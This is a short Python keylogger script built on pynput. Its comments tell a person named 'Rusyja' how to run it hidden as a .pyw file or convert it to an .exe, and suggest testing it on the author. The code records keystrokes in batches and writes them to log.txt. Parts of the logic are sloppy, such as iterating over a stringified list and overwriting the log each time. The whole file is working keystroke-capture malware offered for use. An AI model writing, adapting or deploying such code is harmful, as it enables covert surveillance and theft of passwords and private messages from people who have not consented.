import pynput

#Rusyja's keylogger

#Instructions for Rusyja:
#*NOTE* step 1 may be skipped if the file is already a .py but if you want to edit it yourself then you need to download
#1. Download pycharm -> https://www.jetbrains.com/pycharm/download/#section=windows
#2. To run the script you can save it as a .pyw and double click on it or transform it in a .exe (google that)
#3. Once you have done those steps google which method you would like to use
#4. You can test it on me once you're done and I'm home
#--End--



from pynput.keyboard import Key, Listener
count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count+=1
    print("{0} pressed".format(key))
    if(count >= 10):
        count = 0
        write_file(str(keys))
        keys = []


def write_file(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if(key.find("Space") > 0):
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

